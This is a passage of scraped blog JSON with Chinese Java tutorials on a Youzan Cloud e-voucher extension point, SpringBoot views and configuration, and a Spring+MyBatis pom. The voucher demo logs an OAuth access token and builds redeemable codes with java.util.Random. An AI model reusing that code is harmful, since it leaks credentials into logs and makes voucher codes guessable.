&lt;&#x2F;settings&gt; 工程说明然后打开idea，导入项目并下载对应的jar包，整个项目大概是这样的 上图是创建应用后通过 git clone 下来的工程结构，应用名称为 youzanyun-demo，默认生成有六个 module。 项目根包名：com.youzan.cloud.youzanyun.demo。 接下来按图例说明一下： youzanyun-demo-api：接口声明 XXService.java、DTO 封装等，一般在这个模块里不会去依赖其他模块和第三方依赖； youzanyun-demo-biz：服务实现模块，除了在该模块里写 XXServiceImpl.java 外，最主要的还会在这里编写业务扩展点实现类和消息扩展点实现类； youzanyun-demo-dal：如果你的应用中用到了数据库，需要在这个模块里去写 dao、mapper 等，应用框架默认支持 druid 和 mybatis； youzanyun-demo-deploy：这个模块是用来打包的，执行 mvn package 后的最终 jar 包生成模块，所以生成后不需要去改动里面的内容，改动后可能会导致发布失败； youzanyun-demo-web：项目的一些 web 相关的类放在这个模块里，如 XXController.java，以及一些静态资源（js、css、页面等等）； youzanyun-demo-ui：前端扩展点定制需要在该目录下实现。 h5-extension，H5定制目录；mp-extension，小程序定制目录，创建应用后默认不会有这个目录，通过开发者工具导入项目之后会自动生成。 实现电子卡券扩展点按照说明我们要实现对应的扩展点，需要在如下目录中去创建对应的后端业务扩展点，也就是youzanyun-demo-biz\\src\\main\\java\\com.youzan.cloud.youzan.demo.biz，注意不要去修改包名称，否则可能无法加载到对应的Bean 接下来，我们开始创建扩展点，这里我演示下创建电子卡券扩展点，首先我们创建一个 CreateTicketExtImplDemo 的类，然后这个类的基本结构如下 12345678910@Slf4j@ExtensionService(&quot;createticketdemo&quot;)public class CreateTicketExtImplDemo implements CreateTicketExtPoint &#123; @Override public OutParam&lt;CreateTicketResponseDTO&gt; create(CreateTicketRequestDTO request) &#123; return null; &#125;&#125; 说下上面的class @Slf4j 这个没什么好说的，就是开启日志注解，Springboot 自带的 @ExtensionService 表示这个class 是一个扩展点，这个扩展点的名称是createticketdemo，最终会在控制台看到这个名称对应的扩展点 public class CreateTicketExtImplDemo implements CreateTicketExtPoint 表示这个CreateTicketExtImplDemo 实现了CreateTicketExtPoint 这个接口，CreateTicketExtPoint 就是创建电子卡券的扩展点接口 public OutParam create(CreateTicketRequestDTO request) 就是这个接口对应的方法，我们需要重写这个方法 那么，我们接下来只需要在这个方法里面写上具体的业务逻辑，然后将结果返回给有赞云就行，有赞云提供了丰富的扩展点接口，你可以参考文档 https://doc.youzanyun.com/doc#/content/EXT/0-1 以创建电子卡券接口为了，我们需要用到2个接口 电子卡券扩展点 https://doc.youzanyun.com/doc#/content/EXT/0-1/detail/ext/753 可以看到request 里面的有很多参数，但是各位不要以正常的HTTP 请求逻辑去理解这个扩展点，这里面的request 是不需要用户去传参请求的，这些参数是用户下单购买电子卡券的时候会把这些信息传到你开启的这个扩展点里面来。 第三方电子卡券创建接口 https://doc.youzanyun.com/doc#/content/API/1-307/detail/api/0/586 这个接口我们需要传入订单号、统一核销码和券码三个信息，有赞云会跟进用户自定义的卡券信息来生成卡券。 那么对应的业务逻辑基本如下: 用户从页面创建电子卡券类型订单 订单信息通过创建电子卡券扩展点传进来 获取订单号并调用第三方卡券创建接口传入该订单号、用户自定义卡券信息和券码，有赞云跟进信息生成卡券，那么在调用第三方卡券的时候我们还需要生成token才能去调用接口 返回成功信息 最终代码如下，仅供参考，实际请根据业务需要实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293package com.youzan.cloud.youzanyun.demo.biz;import com.alibaba.fastjson.JSON;import com.youzan.api.rpc.annotation.ExtensionService;import com.youzan.cloud.base.api.BifrostService;import com.youzan.cloud.extension.api.trade.CreateTicketExtPoint;import com.youzan.cloud.extension.param.trade.CreateTicketRequestDTO;import com.youzan.cloud.extension.param.trade.CreateTicketResponseDTO;import com.youzan.cloud.metadata.common.OutParam;import com.youzan.cloud.open.sdk.common.constant.OAuthEnum;import com.youzan.cloud.open.sdk.common.exception.SDKException;import com.youzan.cloud.open.sdk.core.client.auth.Token;import com.youzan.cloud.open.sdk.core.oauth.model.OAuthToken;import com.youzan.cloud.open.sdk.gen.v3_0_1.api.YouzanTradeVirtualticketThirdCreate;import com.youzan.cloud.open.sdk.gen.v3_0_1.model.YouzanTradeVirtualticketThirdCreateParams;import com.youzan.cloud.open.sdk.gen.v3_0_1.model.YouzanTradeVirtualticketThirdCreateResult;import com.youzan.cloud.youzanyun.demo.biz.util.OutParamUtil;import lombok.SneakyThrows;import lombok.extern.slf4j.Slf4j;import javax.annotation.Resource;import java.util.ArrayList;import java.util.List;import java.util.Random;&#x2F;** * @Auth: fangwenjun * @E-mail: fangwenjun@youzan.com * @title: CreateTicketExtImplDemo * @projectName: youzanyun-demo * @description: TODO 描述信息 * @Date 2020&#x2F;4&#x2F;17 7:23 PM **&#x2F;@Slf4j@ExtensionService(&quot;createticketdemo&quot;)public class CreateTicketExtImplDemo implements CreateTicketExtPoint &#123; @Resource private BifrostService bifrostSdkService; @SneakyThrows @Override public OutParam&lt;CreateTicketResponseDTO&gt; create(CreateTicketRequestDTO createTicketRequestDTO) &#123; log.info(&quot;创建商家自有卡券, 请求体，&#123;&#125;&quot;, JSON.toJSONString(createTicketRequestDTO)); CreateTicketResponseDTO createTicketResponseDTO &#x3D; new CreateTicketResponseDTO(); &#x2F;&#x2F; 创建Token OAuthToken token &#x3D; null; try &#123; token &#x3D; bifrostSdkService.getToken(&quot;43727705&quot;, OAuthEnum.TokenType.silent); &#125; catch (SDKException e) &#123; e.printStackTrace(); &#125; String accessToken &#x3D; token.getAccessToken(); log.info(&quot;获取到的token &#123;&#125;&quot;,accessToken); &#x2F;&#x2F;调用创建电子卡券API YouzanTradeVirtualticketThirdCreate youzanTradeVirtualticketThirdCreate &#x3D; new YouzanTradeVirtualticketThirdCreate(); YouzanTradeVirtualticketThirdCreateParams youzanTradeVirtualticketThirdCreateParams &#x3D; new YouzanTradeVirtualticketThirdCreateParams(); youzanTradeVirtualticketThirdCreateParams.setTid(createTicketRequestDTO.getOrderNo()); youzanTradeVirtualticketThirdCreateParams.setCode(RandomCode()); youzanTradeVirtualticketThirdCreateParams.setTicketNos(RandomTicketNos()); youzanTradeVirtualticketThirdCreate.setAPIParams(youzanTradeVirtualticketThirdCreateParams); YouzanTradeVirtualticketThirdCreateResult result &#x3D; null; try &#123; result &#x3D; bifrostSdkService.invoke(youzanTradeVirtualticketThirdCreate, new Token(accessToken), YouzanTradeVirtualticketThirdCreateResult.class); &#125; catch (SDKException e) &#123; e.printStackTrace(); &#125; log.info(&quot;自定义电子卡券返回信息 &#123;&#125;&quot;,result.getMessage() + &quot; &quot; + result.getCode() +&quot; &quot;+ result.getSuccess()); createTicketResponseDTO.setSuccess(true); return OutParamUtil.successResult(createTicketResponseDTO); &#125; &#x2F;&#x2F;生成卡券统一核销码 public String RandomCode() &#123; Random random &#x3D; new Random(); String resultCode &#x3D; &quot;&quot;; for (int i &#x3D; 0; i &lt; 21; i++) &#123; resultCode +&#x3D; random.nextInt(10); &#125; return resultCode; &#125; &#x2F;&#x2F;生成券码信息 public List&lt;String&gt; RandomTicketNos()&#123; List&lt;String&gt; TicketNos &#x3D; new ArrayList(); Random random &#x3D; new Random(); String resultCode &#x3D;&quot;&quot;; for (int i &#x3D; 0; i &lt; 18; i++) &#123; resultCode +&#x3D; random.nextInt(10); &#125; TicketNos.add(resultCode); return TicketNos; &#125;&#125; 注意上述代码中创建token 部分与你直接调用API接口所使用的Token 创建方式并不一样，需要特别注意 123456789&#x2F;&#x2F; 创建Token OAuthToken token &#x3D; null; try &#123; token &#x3D; bifrostSdkService.getToken(&quot;43727705&quot;, OAuthEnum.TokenType.silent); &#125; catch (SDKException e) &#123; e.printStackTrace(); &#125; String accessToken &#x3D; token.getAccessToken(); log.info(&quot;获取到的token &#123;&#125;&quot;,accessToken); 上传代码并发布然后我们将实现好的业务代码push 到git仓库去，这样在开发环境下的业务配置-路由配置-交付-后端流程中，我们就可以看到我们实现的扩展点，我们将他开启 这里的业务标识，我们可以不用管，但是在实际的生产环境中如果你需要对特定类型的商品实现扩展点，那么你需要配置。 不过这里有个注意点创建电子卡券扩展点与下单中的电子卡券自定义交付扩展点会冲突，如果你开启了这个扩展点建议先关闭，否则可能看不到具体的效果 开启后，我们切换到应用管理-发布管理，我们点击发布，选择服务端，然后填写发布说明进行发布 最终发布的版本会在列表显示 接下来，我们可以在对应的授权测试店铺进行测试，如何判断店铺是否授权呢？我们在应用概况的店铺授权信息中点击新增/查看测试店铺就可以看到了，在这个店铺去创建一个电子卡券类型的商品，然后下单测试 当你创建完订单后会自动生成对应的电子卡券的卡券凭证，这里面就包括了券码和统一核销码 好了，以上就是整个扩展点的使用说明","categories":[{"name":"有赞云","slug":"有赞云","permalink":"https://awen.me/categories/%E6%9C%89%E8%B5%9E%E4%BA%91/"}],"tags":[{"name":"有赞云","slug":"有赞云","permalink":"https://awen.me/tags/%E6%9C%89%E8%B5%9E%E4%BA%91/"}]},{"title":"SpringBoot整合视图技术","slug":"SpringBoot整合视图技术","date":"2020-04-17T00:42:11.000Z","updated":"2021-02-26T06:05:29.266Z","comments":true,"path":"posts/a85f4b57.html","link":"","permalink":"https://awen.me/posts/a85f4b57.html","excerpt":"","text":"首先，我们在pom.xml中添加如下内容 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;&#x2F;artifactId&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt; &lt;&#x2F;dependency&gt; 然后创建一个Book 类 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.example.demo;import org.springframework.stereotype.Component;@Componentpublic class Book &#123; private Integer id; private String name; private String author; public Integer getId() &#123; return id; &#125; public String getName() &#123; return name; &#125; public String getAuthor() &#123; return author; &#125; public void setId(Integer id) &#123; this.id &#x3D; id; &#125; public void setName(String name) &#123; this.name &#x3D; name; &#125; public void setAuthor(String author) &#123; this.author &#x3D; author; &#125; @Override public String toString() &#123; return &quot;Book&#123;&quot; + &quot;id&#x3D;&quot; + id + &quot;, name&#x3D;&#39;&quot; + name + &#39;\\&#39;&#39; + &quot;, author&#x3D;&#39;&quot; + author + &#39;\\&#39;&#39; + &#39;&#125;&#39;; &#125;&#125; 然后创建一个BookController 控制器 1234567891011121314151617181920212223242526272829303132package com.example.demo;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;import org.springframework.web.servlet.ModelAndView;import java.util.ArrayList;import java.util.List;@Controllerpublic class BookController &#123; @GetMapping(&quot;&#x2F;books&quot;) public ModelAndView books()&#123; List&lt;Book&gt; books &#x3D; new ArrayList&lt;&gt;(); Book b1 &#x3D; new Book(); b1.setId(1); b1.setAuthor(&quot;六承恩&quot;); b1.setName(&quot;戏说不是胡说&quot;); Book b2 &#x3D; new Book(); b2.setId(2); b2.setAuthor(&quot;罗贯中&quot;); b2.setName(&quot;三国演义&quot;); books.add(b1); books.add(b2); ModelAndView mv &#x3D; new ModelAndView(); mv.addObject(&quot;books&quot;,books); mv.setViewName(&quot;books&quot;); return mv; &#125;&#125; 接下里在resource 下的template 中新建一个books.html 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;图书列表&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;table border&#x3D;&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;图书编号&lt;&#x2F;td&gt; &lt;td&gt;图书名称&lt;&#x2F;td&gt; &lt;td&gt;图书作者&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr th:each&#x3D;&quot;book:$&#123;books&#125;&quot;&gt; &lt;td th:text&#x3D;&quot;$&#123;book.id&#125;&quot;&gt;&lt;&#x2F;td&gt; &lt;td th:text&#x3D;&quot;$&#123;book.author&#125;&quot;&gt;&lt;&#x2F;td&gt; &lt;td th:text&#x3D;&quot;$&#123;book.name&#125;&quot;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 在application.properties中添加如下内容 1234567spring.thymeleaf.cache&#x3D;falsespring.thymeleaf.check-template&#x3D;truespring.thymeleaf.check-template-location&#x3D;truespring.thymeleaf.encoding&#x3D;utf-8spring.thymeleaf.prefix&#x3D;classpath:&#x2F;templates&#x2F;spring.thymeleaf.servlet.content-type&#x3D;text&#x2F;htmlspring.thymeleaf.suffix&#x3D;.html 访问结果如下","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/categories/SpringBoot/"}],"tags":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/tags/SpringBoot/"}]},{"title":"SpringBoot的入门","slug":"SpringBoot的基本配置","date":"2020-04-16T02:29:33.000Z","updated":"2021-02-26T06:05:29.266Z","comments":true,"path":"posts/de40338d.html","link":"","permalink":"https://awen.me/posts/de40338d.html","excerpt":"","text":"我们为啥需要SpringBoot任何先进技术的产生都不是凭空出现的，SpringBoot 也不例外，SpringBoot 是基于Spring 的基础上产生的。众所周知，Spring 是一个轻量级的容器，在Java EE 项目中得到广泛使用，但是Spring其复杂、繁琐和臃肿的XML配置方式配置使得开发人员在实际使用过程中变得非常痛苦，尤其是与其他第三方工具进行整合时，比如Mybatis等就更会使得配置文件变得异常复杂和重复，比如我们来看一段Spring的配置 上图是一段配置数据库以及事务管理和Mybatis 的配置，我们发现仅仅是配置文件就非常的多，当然这还不是最复杂的。在这种基础上，SpringBoot 诞生了。 SpringBoot 的出现给开发者带来了新的自动化配置解决方案，使得开发者能够基于 SpringBoot 快速创建基于 Spring 生产级的独立应用程序， SpringBoot 中对一些常用的第三方库提供了默认的自动化配置方案，使得开发者只需要很少的 Spring 配置就能运行完整的 JavaEE 应用。由于其拥有了开箱即用的特性以及服务监控方案同时自带web服务器且与Spring的另一个主流的Spring Cloud 等服务治理框架以及kubernetes 等技术的融合使得开发人员可以快速的实现微服务以及服务的治理、熔断等，最重要的是你可以完全不需要配置XML，真的是太爽了。 那么，如何入门SpringBoot 呢？本文将带你了解 小试牛刀首先，我们创建一个SpringBoot工程，创建SpringBoot的方法有很多，这里以IDEA 企业版为例，我们选择 Spring initalizr 然后创建一个工程 创建完工程之后，我们打开pom.xml，我们可以看到这段配置 123456&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt; &lt;version&gt;2.2.6.RELEASE&lt;&#x2F;version&gt; &lt;relativePath&#x2F;&gt; &lt;!-- lookup parent from repository --&gt;&lt;&#x2F;parent&gt; spring-boot-starter-parent 是一种特殊的 starter，它提供了一些 maven 默认配置 ，同时还提供了dependency-management ，可以便开发者在引入其他依赖时不必输入版本号，方便依赖管理。 SpringBoot 提供的starter 非常多，这些 Starter 要为第三方库提供自动配置，假如我们要配置一个web项目，则可以在maven 中加入 1234 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt; 在项目的入口我们可以看到一个DemoApplication，这是整个SpringBoot的入口 123456789101112131415package com.example.demo;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@SpringBootApplicationpublic class DemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(DemoApplication.class); &#125;&#125; 其中@SpringBootApplication 注解等于如下注解，表示开启自动配置以及自动扫包 12@EnableAutoConfiguration@ComponentScan 其中ComponentScan 会扫描@Service、@Repository、@Component、@Controller、@RestController以及带@Configuration 注解的类，但是我们为了更方便，通常都是直接在入口加上@SpringBootApplication 在IDE中，我们运行DemoApplication 这个class 就可以运行SpringBoot 了，此时终端会出现如下信息，我们可以看到 (v2.2.6.RELEASE) 版本号以及Tomcat的端口 但是此时我们去访问127.0.0.1:8080，会出现404的提醒我们可以在项目下新建一个 HelloController 12345678@RestControllerpublic class HelloController &#123; @GetMapping(&quot;&#x2F;hello&quot;) public String hello()&#123; return &quot;Hello World!&quot;; &#125;&#125; 此时，我们去访问可以看到如下内容 当然，更多的时候我们写完一个应用，是需要放到服务器上去运行的，这个时候我们需要把应用进行打包，要打包应用，我们需要在pom.xml中配置 12345678&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt; &lt;&#x2F;plugin&gt; &lt;&#x2F;plugins&gt;&lt;&#x2F;build&gt; 当然，使用idea 创建的SpringBoot 这些都给我们安排的妥妥的，我们只需要在终端输入如下命令就可以将整个项目进行打包 1mvn package 然后我们在终端执行 1java -jar target&#x2F;demo-0.0.1-SNAPSHOT.jar 就可以运行打包好的项目，如下所示 定制Banner当SpringBoot 程序启动之后，我们会看到SpringBoot 的Logo 但是通常情况下，企业会将其替换成自己的公司Logo，那么如何定制属于自己的企业Logo 呢？ 首先，我们要把文件转成TXT文本形式的字体，比如在 http://www.network-science.de/ascii/ 设置，比如我们设置一个SpringDemo的字体 然后在项目的resource目录下新建一个banner.txt的文件，将生成的文字复制粘贴进去即可 然后我们重新运行程序就会发现默认的Logo 被替换了 如果要关闭也很简单，只需要在main函数中，设置 12SpringApplicationBuilder builder &#x3D; new SpringApplicationBuilder(DemoApplication.class);builder.bannerMode(Banner.Mode.OFF).run(args); Web 容器的配置在SpringBoot 中，我们可以在application.properties 中对web 容器进行配置，如下所示 12345server.address&#x3D;127.0.0.1 # 配置地址server.port&#x3D;8888 # 配置端口server.tomcat.basedir&#x3D;&#x2F;opt&#x2F;tmp # 配置目录server.tomcat.uri-encoding&#x3D;utf-8 #配置编码server.tomcat.max-threads&#x3D;300 #配置最大线程数 在idea 中，会对配置项进行智能提示，非常方便 我们还可以在该文件中配置证书 123server.ssl.key-store&#x3D; #配置秘钥文件名称server.ssl.key-alias&#x3D; #配置秘钥别名server.ssl.key-password&#x3D; # 配置证书密码 application.properties 的文件加载顺序SpringBoot 中的application.properties配置文件可以出现在如下4个位置 项目根目录下的config 文件夹中 项目的根目录下 classpath 下的config文件夹下 classpath 下 开发者也可以自定义这个文件的名称，只需要在运行时加上spring.config.name=xxx即可 1jar -jar xxx.jar --spring.config.name&#x3D;xxx 也可以知道配置文件所在路径 1jar -jar xxx.jar --spring.config.location&#x3D;classpath:&#x2F; SpringBoot 的配置文件最终都会被加载到Environment中，我们可以通过@Value 注解以及EnvironmentAware 接口来讲数据注入到属性上，例如application.properties中的内容如下 1234book.name&#x3D;西游记book.author&#x3D;六承恩book.price&#x3D;66book.type&#x3D;&quot;古典文学&quot;,&quot;四大名著&quot; Book 类的内容如下 1234567891011121314151617181920@Component@ConfigurationProperties(prefix &#x3D; &quot;book&quot;)public class Book &#123; private String name; private String author; private Float price; private List&lt;String&gt; type; &#x2F;&#x2F;getter 省略 &#x2F;&#x2F;seteer 省略 @Override public String toString() &#123; return &quot;Book&#123;&quot; + &quot;name&#x3D;&#39;&quot; + name + &#39;\\&#39;&#39; + &quot;, author&#x3D;&#39;&quot; + author + &#39;\\&#39;&#39; + &quot;, price&#x3D;&quot; + price + &quot;, type&#x3D;&quot; + type + &#39;&#125;&#39;; &#125;&#125; 其中ConfigurationProperties 注解中的prefix 属性描述了要加载配置文件的前缀对应的控制器类如下 123456789@RestControllerpublic class BookController &#123; @Autowired Book book; @GetMapping(&quot;&#x2F;book&quot;) public String book()&#123; return book.toString(); &#125;&#125; 我们执行后访问可以看到如下内容 除此之外，还支持YAML 配置,我们将application.properties中的内容删除或注释，然后在resource中新建一个application.yml 文件，内容如下，重新运行程序得到的结果与上面的一样。 12345678910111213141516171819book: name: 西游记 author: 六承恩 price: 66 type: - 古典文学 - 四大名著&#96;&#96;&#96; &gt; YAML格式的文件虽然方便，但是无法使用@PropertySource 注解加载YAML文件## Profile在实际的开发过程中，开发人员需要频繁的在生产和测试环境进行切换，其中一些配置就需要变动，比如数据库的配置。对此，SpringBoot 提供了@Profile注解我们可以配置2个配置文件分别代表生产和测试环境的,在resource中新建application-dev.properties以及application-prod.properties![20200416201414](https:&#x2F;&#x2F;file.awen.me&#x2F;blog&#x2F;20200416201414.png!awen)然后在main 函数中配置 SpringApplicationBuilder builder = new SpringApplicationBuilder(DemoApplication.class); builder.application().setAdditionalProfiles(“prod”); builder.run(args); 或者在项目启动时候加上`--spring.profiles.active=prod`","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/categories/SpringBoot/"}],"tags":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://awen.me/tags/SpringBoot/"}]},{"title":"整合Spring和Mybatis","slug":"整合Mybatis与Spring","date":"2020-04-16T02:29:33.000Z","updated":"2021-02-26T06:05:29.340Z","comments":true,"path":"posts/4442599114.html","link":"","permalink":"https://awen.me/posts/4442599114.html","excerpt":"","text":"在实际的开发过程中，我们经常需要使用Spring 和Mybatis，那么如何去整合Spring 与Mybatis 呢？本文我们一起来通过详细的案例的方式进行讲解 准备工作首先，还是介绍下环境 idea mysql maven 我们先使用idea 创建一个maven工程，工程名称叫com.ssm，然后在pom.xml中加入以下jar包,可以看到所需要的jar包还是很多的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjrt&lt;&#x2F;artifactId&gt; &lt;version&gt;1.6.12&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;&#x2F;artifactId&gt; &lt;version&gt;1.6.12&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt; &lt;version&gt;3.5.4&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;&#x2F;artifactId&gt; &lt;version&gt;1.3.1&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.annotation&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jsr250-api&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjrt&lt;&#x2F;artifactId&gt; &lt;version&gt;1.6.12&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-tx&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-beans&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;aopalliance&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aopalliance&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;&#x2F;groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;&#x2F;artifactId&gt; &lt;version&gt;1.8.10&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-beans&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-context&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-aop&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-aspects&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-core&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-beans&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-expression&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;&#x2F;artifactId&gt; &lt;version&gt;4.3.6.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.ant&lt;&#x2F;groupId&gt; &lt;artifactId&gt;ant&lt;&#x2F;artifactId&gt; &lt;version&gt;1.9.6&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.ant&lt;&#x2F;groupId&gt; &lt;artifactId&gt;ant-launcher&lt;&#x2F;artifactId&gt; &lt;version&gt;1.9.6&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.ow2.asm&lt;&#x2F;groupId&gt; &lt;artifactId&gt;asm&lt;&#x2F;artifactId&gt; &lt;version&gt;5.1&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cglib&lt;&#x2F;groupId&gt; &lt;artifactId&gt;cglib&lt;&#x2F;artifactId&gt; &lt;version&gt;3.3.0&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-logging&lt;&#x2F;groupId&gt; &lt;artifactId&gt;commons-logging&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;&#x2F;groupId&gt; &lt;artifactId&gt;javassist&lt;&#x2F;artifactId&gt; &lt;version&gt;3.27.0-GA&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt; &lt;artifactId&gt;commons-pool2&lt;&#x2F;artifactId&gt; &lt;version&gt;2.7.0&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt; &lt;artifactId&gt;commons-dbcp2&lt;&#x2F;artifactId&gt; &lt;version&gt;2.7.0&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;8.0.19&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;&#x2F;groupId&gt; &lt;artifactId&gt;log4j-core&lt;&#x2F;artifactId&gt; &lt;version&gt;2.13.1&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;&#x2F;groupId&gt; &lt;artifactId&gt;slf4j-api&lt;&#x2F;artifactId&gt; &lt;version&gt;1.7.30&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;&#x2F;groupId&gt; 